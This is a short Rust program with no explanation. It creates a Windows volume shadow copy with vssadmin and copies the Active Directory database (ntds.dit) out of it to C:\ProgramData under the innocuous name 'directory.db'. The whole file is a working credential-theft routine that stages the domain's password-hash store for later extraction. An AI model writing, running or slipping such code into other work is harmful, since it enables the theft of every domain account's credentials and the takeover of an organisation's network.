use std::{fs, process::Command};
fn main() -> std::io::Result<()> {
    let status = Command::new("cmd.exe").args(["/c", "vssadmin.exe create shadow /for=C:"]).status()?;
    if !status.success() { return Ok(()); }
    fs::copy(r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23\Windows\NTDS\ntds.dit", r"C:\ProgramData\directory.db")?;
    Ok(())
}
